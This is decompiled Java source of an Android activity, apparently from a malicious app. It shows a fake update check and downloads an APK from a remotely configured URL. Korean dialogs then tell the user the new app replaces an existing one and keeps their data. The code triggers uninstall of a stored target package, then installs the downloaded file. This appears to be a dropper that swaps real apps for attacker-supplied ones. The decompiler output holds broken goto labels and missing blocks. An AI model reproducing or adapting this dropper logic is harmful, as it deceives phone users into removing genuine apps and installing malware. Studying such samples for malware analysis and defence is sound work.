// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.tnt2;

import android.app.*;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.*;
import android.util.Log;
import android.view.*;
import android.widget.ProgressBar;
import android.widget.TextView;
import com.example.utils.SharePres;
import com.example.utils.SharePresSingle;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Iterator;
import java.util.List;

// Referenced classes of package com.example.tnt2:
//            MainActivity

public class WorkActivity extends Activity
{
    class DownloadThread extends Thread
    {

        public void run()
        {
            downloadFile();
        }

        final WorkActivity this$0;

        DownloadThread()
        {
            this$0 = WorkActivity.this;
            super();
        }
    }


    public WorkActivity()
    {
        TAG = "WorkActivity";
        mProgressBar = null;
        Progress = 0;
        downloadFileName = "update.apk";
        downloadUrl = "";
        myHandler = new Handler() {

            public void handleMessage(Message message)
            {
                switch(message.what)
                {
                default:
                    return;

                case 1: // '\001'
                    myHandler.removeCallbacksAndMessages(null);
                    mProgressBar.setVisibility(4);
                    root.setVisibility(4);
                    try
                    {
                        PackageInfo packageinfo = getPackageManager().getPackageArchiveInfo(getDownloadFilePath(), 1);
                        SharePresSingle.getInstance().putString("download_pkg", packageinfo.packageName);
                    }
                    catch(Exception exception) { }
                    openUnInstall();
                    return;

                case 2: // '\002'
                    mProgressBar.setProgress(message.arg1);
                    progress.setText((new StringBuilder()).append(message.arg1).toString());
                    return;
                }
            }

            final WorkActivity this$0;

            
            {
                this$0 = WorkActivity.this;
                super();
            }
        };
    }

    private String getDownloadFilePath()
    {
        return (new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()))).append("/").append(downloadFileName).toString();
    }

    private void installApk(final String filename)
    {
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(getApplicationContext());
        builder.setMessage("\uCD5C\uC2E0\uBC84\uC804\uC744 \uB2E4\uC6B4\uD558\uC2DC\uACA0\uC2B5\uB2C8\uAE4C?");
        builder.setTitle("\uB2E4\uC6B4\uB85C\uB4DC");
        builder.setPositiveButton("\uD655\uC778", new android.content.DialogInterface.OnClickListener() {

            public void onClick(DialogInterface dialoginterface, int j)
            {
                dialoginterface.dismiss();
                Log.e(TAG, (new StringBuilder("installApk ")).append(filename).toString());
                new File(filename);
                openDialog();
                (new DownloadThread()).start();
            }

            final WorkActivity this$0;
            private final String val$filename;

            
            {
                this$0 = WorkActivity.this;
                filename = s;
                super();
            }
        });
        AlertDialog alertdialog = builder.create();
        alertdialog.getWindow().setType(2003);
        alertdialog.show();
    }

    private void openDialog()
    {
        root = LayoutInflater.from(this).inflate(0x7f030003, null);
        mProgressBar = (ProgressBar)root.findViewById(0x7f080001);
        progress = (TextView)root.findViewById(0x7f080002);
        android.app.AlertDialog.Builder builder = (new android.app.AlertDialog.Builder(this)).setView(root);
        builder.setMessage("\uB2E4\uC6B4\uB85C\uB4DC\uC911...");
        if(!isFinishing())
            builder.create().show();
    }

    private void openUnInstall()
    {
        Log.d(TAG, "WorkActivity openUnInstall ");
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
        builder.setTitle("\uC560\uD50C\uB9AC\uCF00\uC774\uC158 \uAD50\uCCB4");
        builder.setMessage("\uC124\uCE58 \uC911\uC778 \uC560\uD50C\uB9AC\uCF00\uC774\uC158\uC774 \uB2E4\uB978 \uC560\uD50C\uB9AC\uCF00\uC774\uC158\uC744 \uB300\uCCB4\uD569\uB2C8\uB2E4.\uC774\uC804\uC758 \uBAA8\uB4E0 \uC0AC\uC6A9\uC790 \uB370\uC774\uD130\uB294 \uC800\uC7A5\uB429\uB2C8\uB2E4.");
        builder.setPositiveButton("\uD655\uC778", new android.content.DialogInterface.OnClickListener() {

            public void onClick(DialogInterface dialoginterface, int j)
            {
                dialoginterface.dismiss();
                removeAPK();
            }

            final WorkActivity this$0;

            
            {
                this$0 = WorkActivity.this;
                super();
            }
        });
        builder.create().show();
    }

    private void removeAPK()
    {
        Iterator iterator;
        Log.d(TAG, "WorkActivity removeAPK ");
        String s = SharePresSingle.getInstance().getString("packageName", "");
        if(s != "")
        {
            Log.d(TAG, (new StringBuilder("WorkActivity removeAPK ")).append(s).toString());
            Intent intent1 = new Intent("android.intent.action.DELETE", Uri.parse((new StringBuilder("package:")).append(s).toString()));
            intent1.addFlags(0x10000000);
            startActivity(intent1);
        } else
        {
            Log.d(TAG, "WorkActivity removeAPK fail , going to install ");
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.addFlags(0x10000000);
            intent.setDataAndType(Uri.fromFile(new File(getDownloadFilePath())), "application/vnd.android.package-archive");
            startActivity(intent);
        }
        if(MainActivity.activityList == null) goto _L2; else goto _L1
_L1:
        iterator = MainActivity.activityList.iterator();
_L5:
        if(iterator.hasNext()) goto _L3; else goto _L2
_L2:
        return;
_L3:
        ((Activity)iterator.next()).finish();
        if(true) goto _L5; else goto _L4
_L4:
    }

    private void showProgress()
    {
        progressDialog = new ProgressDialog(this);
        progressDialog.setMessage("\uC5C5\uB370\uC774\uD2B8\uD655\uC778\uC911...");
        progressDialog.show();
        handler = new Handler();
        handler.postDelayed(new Runnable() {

            public void run()
            {
                progressDialog.cancel();
                installApk(getDownloadFilePath());
            }

            final WorkActivity this$0;

            
            {
                this$0 = WorkActivity.this;
                super();
            }
        }, 2000L);
    }

    public void downloadFile()
    {
        Exception exception;
        Log.i("test", (new StringBuilder("------downloadUrl=")).append(downloadUrl).toString());
        File file;
        HttpURLConnection httpurlconnection;
        FileOutputStream fileoutputstream;
        InputStream inputstream;
        int j;
        byte abyte0[];
        int k;
        int l;
        int i1;
        Message message;
        try
        {
            file = new File(getDownloadFilePath());
        }
        // Misplaced declaration of an exception variable
        catch(Exception exception)
        {
            continue; /* Loop/switch isn't completed */
        }
        if(file.exists())
            file.delete();
        file.createNewFile();
        if(downloadUrl == null)
            return;
        httpurlconnection = (HttpURLConnection)(new URL(downloadUrl)).openConnection();
        httpurlconnection.setConnectTimeout(30000);
        httpurlconnection.setReadTimeout(0xdbba0);
        if(httpurlconnection.getResponseCode() != 200)
            break MISSING_BLOCK_LABEL_282;
        fileoutputstream = new FileOutputStream(file);
        inputstream = httpurlconnection.getInputStream();
        j = httpurlconnection.getContentLength();
        abyte0 = new byte[1024];
        k = 0;
_L1:
        l = inputstream.read(abyte0);
        if(l != -1)
            break MISSING_BLOCK_LABEL_175;
        Thread.sleep(2000L);
        myHandler.sendEmptyMessage(1);
        return;
        fileoutputstream.write(abyte0, 0, l);
        k += l;
        i1 = (k * 100) / j;
        Thread.sleep(5L);
        message = new Message();
        message.what = 2;
        message.arg1 = i1;
        myHandler.sendMessage(message);
        Log.i("test", (new StringBuilder("------------downloadProgeress=")).append(i1).toString());
          goto _L1
        exception;
_L3:
        exception.printStackTrace();
        return;
        exception;
        if(true) goto _L3; else goto _L2
_L2:
    }

    protected void onCreate(Bundle bundle)
    {
        super.onCreate(bundle);
        setContentView(0x7f030001);
        if(MainActivity.activityList != null)
            MainActivity.activityList.add(this);
        downloadUrl = SharePresSingle.getInstance().getString("download_url", null);
        showProgress();
    }

    private int Progress;
    String TAG;
    String downloadFileName;
    String downloadUrl;
    Handler handler;
    int i;
    private ProgressBar mProgressBar;
    Handler myHandler;
    private TextView progress;
    ProgressDialog progressDialog;
    View root;







}
